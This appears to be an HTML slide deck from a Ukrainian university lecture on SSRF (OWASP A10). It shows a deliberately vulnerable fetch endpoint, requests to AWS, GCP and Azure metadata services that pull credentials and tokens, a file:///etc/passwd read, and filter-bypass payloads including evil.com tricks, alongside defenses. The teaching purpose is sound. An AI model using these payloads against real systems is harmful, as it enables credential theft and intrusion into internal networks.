@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 8.7 — A10: SSRF (Server-Side Request Forgery)</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="8">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>A10: SSRF — Server-Side Request Forgery</h1>
+      <div class="subtitle">Тема 8.7 — Безпека веб-додатків: OWASP Top 10 (Частина 2)</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: Механізм атаки -->
+    <section class="slide">
+      <h2>SSRF: механізм атаки</h2>
+
+      <div class="info-box" style="margin-bottom: 1.5rem;">
+        SSRF — зловмисник змушує <strong class="highlight">сервер</strong> виконати HTTP-запит до довільного ресурсу, обходячи firewall та мережеві ACL. Особливо небезпечна у <strong>хмарних середовищах</strong>.
+      </div>
+
+      <div class="flow-row" style="margin: 1rem 0;">
+        <div class="flow-step">
+          <div class="step-title">Зловмисник</div>
+        </div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step">
+          <div class="step-title">Вразливий сервер</div>
+        </div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-step">
+          <div class="step-title">Внутрішня мережа</div>
+        </div>
+      </div>
+
+      <div class="two-column" style="margin-top: 1.5rem;">
+        <div class="column">
+          <div class="card-red">
+            <h3>Вразливий код</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.72em;">
+// Завантаження за URL
+app.get('/fetch', async (req, res) => {
+  const resp = await
+    fetch(req.query.url);
+  res.send(await resp.text());
+});
+
+// Атака:
+GET /fetch?url=
+  http://169.254.169.254/
+  latest/meta-data/
+            </div>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-purple">
+            <h3>Вектори атаки</h3>
+            <ul style="font-size: 0.85em; margin-top: 0.8rem; line-height: 1.7;">
+              <li><strong>Cloud metadata</strong> — IAM credentials</li>
+              <li><strong>Internal services</strong> — Jenkins, Redis, DB</li>
+              <li><strong>Port scanning</strong> — внутрішня мережа</li>
+              <li><strong>File read</strong> — <code>file:///etc/passwd</code></li>
+              <li><strong>Gopher</strong> — довільні TCP-пакети</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 3: Cloud metadata та Capital One -->
+    <section class="slide">
+      <h2>Хмарні метадані: головна ціль SSRF</h2>
+
+      <div class="three-col-grid" style="margin-top: 1rem;">
+        <div class="card-yellow">
+          <h3>AWS IMDSv1</h3>
+          <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+GET http://169.254.169.254/
+  latest/meta-data/
+  iam/security-credentials/
+  role-name
+
+→ AccessKeyId
+→ SecretAccessKey
+→ Token
+          </div>
+        </div>
+
+        <div class="card-blue">
+          <h3>GCP</h3>
+          <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+GET http://metadata.
+  google.internal/
+  computeMetadata/v1/
+  instance/
+  service-accounts/
+  default/token
+
+Header: Metadata-Flavor:
+  Google
+          </div>
+        </div>
+
+        <div class="card-purple">
+          <h3>Azure</h3>
+          <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+GET http://169.254.169.254/
+  metadata/identity/
+  oauth2/token?
+  api-version=
+  2018-02-01
+
+Header: Metadata: true
+          </div>
+        </div>
+      </div>
+
+      <div class="warning-box" style="margin-top: 1.5rem;">
+        <strong>Capital One (2019):</strong> SSRF через WAF → AWS metadata → IAM credentials → витік даних <strong>106 млн клієнтів</strong>. Штраф: $80 млн. AWS відповів випуском <strong>IMDSv2</strong> (вимагає PUT + токен).
+      </div>
+    </section>
+
+    <!-- Slide 4: Обхід та захист -->
+    <section class="slide">
+      <h2>Обхід фільтрів та захист від SSRF</h2>
+
+      <div class="two-column" style="margin-top: 1rem;">
+        <div class="column">
+          <div class="card-red">
+            <h3>Обхід фільтрів</h3>
+            <div class="code-block" style="margin-top: 0.8rem; font-size: 0.68em;">
+# Обхід "localhost"
+http://127.1
+http://0x7f000001
+http://[::1]
+http://localtest.me
+
+# Обхід "169.254.169.254"
+http://[::ffff:169.254.169.254]
+http://2852039166
+http://0xA9FEA9FE
+
+# URL parsing tricks
+http://evil.com@169.254.169.254
+# Redirect bypass
+http://evil.com/redirect→internal
+            </div>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-green">
+            <h3>Захист (Application)</h3>
+            <ul style="font-size: 0.82em; margin-top: 0.8rem; line-height: 1.7;">
+              <li><strong>Allowlist</strong> доменів/IP</li>
+              <li>Блокувати приватні діапазони</li>
+              <li>Блокувати file://, gopher://</li>
+              <li>DNS resolve перед запитом</li>
+              <li>Disable redirects</li>
+            </ul>
+          </div>
+
+          <div class="card-blue" style="margin-top: 1rem;">
+            <h3>Захист (Network)</h3>
+            <ul style="font-size: 0.82em; margin-top: 0.8rem; line-height: 1.7;">
+              <li><strong>IMDSv2</strong> (AWS) — PUT + token</li>
+              <li>Firewall — block outbound to internal</li>
+              <li>Network segmentation</li>
+              <li>Zero Trust architecture</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </div>
+
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
